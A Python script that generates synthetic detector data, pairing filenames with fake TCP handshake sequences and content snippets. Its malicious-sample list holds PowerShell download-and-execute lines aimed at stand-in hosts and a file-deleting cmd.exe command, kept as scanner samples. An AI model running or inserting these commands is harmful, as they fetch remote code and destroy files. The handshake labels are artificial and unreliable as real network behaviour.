#!/usr/bin/env python3
"""
augment_tcp_handshake.py

Generates archive/tcp_sequences_by_filename.jsonl by augmenting existing datasets
with synthetic TCP handshake sequences keyed by filename. This enables PDA validation
mapped to DFA-flagged filenames.

Inputs (searched under ./archive):
- Malicious_file_trick_detection.jsonl (expects entries with {filename, is_malicious} or similar)
- combined_random.csv (tries to infer columns; if none usable, skips rows)
- malware.csv (tries to infer columns)

Output:
- archive/tcp_sequences_by_filename.jsonl where each line is:
  {"trace_id": <filename>, "sequence": [...], "valid": <bool>, "description": <str>, "category": <str>}

Rules:
- For entries labeled malicious: generate invalid sequences (e.g., SYN only, wrong order, RST)
- For entries labeled benign: generate valid 3-way handshake sequences (optionally with DATA)

Note: This script is conservative: if it cannot find a filename per row, it skips the row.
"""
import json
import csv
import os
import random
from typing import Dict, List, Tuple

ARCHIVE_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'archive')
OLD_DATASET = os.path.join(os.path.dirname(os.path.dirname(__file__)), '.old-dataset')
OUT_TRICKS = os.path.join(ARCHIVE_DIR, 'tcp_tricks.jsonl')
OUT_CSV = os.path.join(ARCHIVE_DIR, 'combined_with_tcp.csv')

random.seed(311)

VALID_SEQS = [
    ["SYN", "SYN-ACK", "ACK"],
    ["SYN", "SYN-ACK", "ACK", "DATA", "ACK"],
    ["SYN", "SYN-ACK", "ACK", "FIN", "ACK"],
]
INVALID_SEQS = [
    ["SYN"],
    ["SYN", "SYN-ACK"],
    ["ACK"],
    ["SYN", "ACK"],
    ["RST"],
    ["ACK", "SYN", "SYN-ACK"],
]

# Synthetic content snippets to pair with filenames for content DFA
MALICIOUS_CONTENT_SNIPPETS = [
    "powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')",
    "cmd.exe /c del C:\\Users\\Public\\*.txt",
    "IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')",
    "Invoke-WebRequest http://bad.site | IEX",
    "TVqQAAMAAAAEAAAA base64 payload header",
]

BENIGN_CONTENT_SNIPPETS = [
    "Readme: This is a harmless text file.",
    "User guide: usage instructions and notes.",
    "Changelog: fixed bugs and improved docs.",
    "Configuration: key=value pairs; no executable content.",
    "Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
]


def choose_sequence(is_malicious: bool) -> Tuple[List[str], bool, str, str]:
    if is_malicious:
        seq = random.choice(INVALID_SEQS)
        return seq, False, "Synthetic invalid handshake for malicious filename", "Derived Malicious"
    else:
        seq = random.choice(VALID_SEQS)
        return seq, True, "Synthetic valid handshake for benign filename", "Derived Benign"


def choose_content(is_malicious: bool) -> str:
    """Return a synthetic content snippet for content-DFA scanning."""
    if is_malicious:
        return random.choice(MALICIOUS_CONTENT_SNIPPETS)
    return random.choice(BENIGN_CONTENT_SNIPPETS)


def read_jsonl_filenames(path: str) -> List[Tuple[str, bool]]:
    out = []
    if not os.path.exists(path):
        return out
    with open(path, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
            except Exception:
                continue
            # Try common keys
            filename = obj.get('filename') or obj.get('name') or obj.get('file')
            if not filename:
                continue
            # Label inference
            is_mal = obj.get('is_malicious')
            if is_mal is None:
                cat = (obj.get('category') or '').lower()
                # Heuristic: category containing 'malicious' or technique known keywords
                is_mal = 'malicious' in cat or bool(obj.get('technique'))
            out.append((filename, bool(is_mal)))
    return out


def read_csv_filenames(path: str, default_malicious: bool = False) -> List[Tuple[str, bool]]:
    out = []
    if not os.path.exists(path):
        return out
    with open(path, 'r', encoding='utf-8') as f:
        reader = csv.DictReader(f)
        # Detect candidate filename column
        fname_col = None
        for c in reader.fieldnames or []:
            lc = c.lower()
            if lc in ('filename', 'file', 'name', 'path'):
                fname_col = c
                break
        type_col = None
        for c in reader.fieldnames or []:
            if c.lower() == 'type':
                type_col = c
                break
        for row in reader:
            fn = None
            if fname_col:
                fn = row.get(fname_col)
            # if unavailable, try to synthesize a filename from hash columns (best-effort)
            if not fn:
                for key in ('sha256', 'md5', 'hash'):
                    if row.get(key):
                        fn = f"{row[key]}.bin"
                        break
            if not fn:
                continue
            # Determine label
            is_mal = default_malicious
            if type_col:
                # combined_random.csv convention: type=1 benign, type=0 malicious
                try:
                    tval = int(row.get(type_col, ''))
                    is_mal = (tval == 0)
                except Exception:
                    pass
            out.append((fn, is_mal))
    return out


def main():
    os.makedirs(ARCHIVE_DIR, exist_ok=True)
    jsonl_path = os.path.join(OLD_DATASET, 'Malicious_file_trick_detection.jsonl')
    comb_path = os.path.join(OLD_DATASET, 'combined_random.csv')
    malw_path = os.path.join(OLD_DATASET, 'malware.csv')

    # 1) Build TCP traces for the tricks JSONL dataset (write JSONL, preserve labels)
    tricks = read_jsonl_filenames(jsonl_path)
    written_tricks = 0
    # Overwrite tricks JSONL (fresh each run)
    with open(OUT_TRICKS, 'w', encoding='utf-8') as out:
        for filename, is_mal in tricks:
            seq, valid, desc, cat = choose_sequence(is_mal)
            content = choose_content(is_mal)
            rec = {
                "trace_id": filename,
                "sequence": seq,
                "valid": valid,
                "description": desc,
                "category": cat,
                "content": content,
            }
            out.write(json.dumps(rec) + "\n")
            written_tricks += 1

    # 2) Build TCP traces for the combined CSV dataset using the SAME filename
    #    synthesis as DFAModule.integrateCombinedAndMalwareCSVs to ensure match.
    def synth_filename_from_hash(hash_value: str, malicious: bool) -> str:
        base = (hash_value or '')[:16]
        return f"{base}{'.exe' if malicious else '.txt'}"

    def iter_combined_rows(path: str):
        if not os.path.exists(path):
            return []
        rows = []
        with open(path, 'r', encoding='utf-8') as f:
            reader = csv.reader(f)
            header = next(reader, None)
            for row in reader:
                if not row:
                    continue
                # Expect format: type,hash
                if len(row) < 2:
                    continue
                rows.append((row[0], row[1]))
        return rows

    csv_pairs: List[Tuple[str, bool]] = []
    # combined_random.csv: type=1 benign, type=0 malicious
    for tval, hv in iter_combined_rows(comb_path):
        malicious = (tval.strip() == '0')
        filename = synth_filename_from_hash(hv.strip(), malicious)
        csv_pairs.append((filename, malicious))
    # malware.csv: all malicious
    for _tval, hv in iter_combined_rows(malw_path):
        filename = synth_filename_from_hash(hv.strip(), True)
        csv_pairs.append((filename, True))

    # Deduplicate preserving first occurrence
    seen_csv = set()
    dedup_csv: List[Tuple[str, bool]] = []
    for fn, mal in csv_pairs:
        if fn in seen_csv:
            continue
        seen_csv.add(fn)
        dedup_csv.append((fn, mal))

    written_csv = 0
    # 2b) Also include CSV-derived entries into JSONL so both datasets are equally usable
    # Overwrite CSV fresh and write JSONL entries for CSV rows too (malicious + benign)
    with open(OUT_CSV, 'w', encoding='utf-8', newline='') as f, open(OUT_TRICKS, 'a', encoding='utf-8') as out_jsonl:
        writer = csv.writer(f)
        writer.writerow(["trace_id","sequence","valid","description","category","content"])
        for filename, is_mal in dedup_csv:
            seq, valid, desc, cat = choose_sequence(is_mal)
            seq_str = "|".join(seq)
            content = choose_content(is_mal)
            writer.writerow([filename, seq_str, "true" if valid else "false", desc, cat, content])
            rec = {
                "trace_id": filename,
                "sequence": seq,
                "valid": valid,
                "description": desc,
                "category": cat,
                "content": content,
            }
            out_jsonl.write(json.dumps(rec) + "\n")
            written_csv += 1

    # Final stats
    print(f"Wrote {written_tricks} trick JSONL traces (malicious+benign) to {OUT_TRICKS}")
    print(f"Wrote {written_csv} CSV traces (malicious+benign) to {OUT_CSV} and mirrored them into JSONL")


if __name__ == '__main__':
    main()
